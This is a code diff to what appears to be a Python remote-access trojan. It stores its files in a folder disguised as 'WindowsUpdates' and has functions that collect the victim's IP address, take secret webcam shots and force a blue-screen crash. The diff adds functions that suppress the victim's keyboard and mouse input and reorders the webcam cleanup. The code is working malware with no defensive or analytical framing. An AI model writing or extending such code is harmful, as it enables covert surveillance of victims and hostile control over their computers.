@@ -15,9 +15,12 @@ import time
 import pyautogui
 import numpy as np
 import imageio
+import pynput
 
 operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
 nullptr = POINTER(c_int)()
+kb_listener = pynput.keyboard.Listener(suppress=True)
+m_listener = pynput.mouse.Listener(suppress=True)
 
 def pc_info():
   ip = os.popen("ipconfig | findstr IPv4").read()
@@ -52,8 +55,8 @@ def webcamshot():
   camera.start()
   time.sleep(1)
   img = camera.get_image()
-  camera.stop()
   pygame.image.save(img, f"{operation_dir}\\webcamshot.png")
+  camera.stop()
   return f"{operation_dir}\\webcamshot.png"
 
 def bsod():
@@ -72,3 +75,11 @@ def bsod():
     c_uint(6),
     byref(c_uint())
 )
+
+def block_input():
+  kb_listener.start()
+  m_listener.start()
+
+def unblock_input():
+  kb_listener.stop()
+  m_listener.stop()
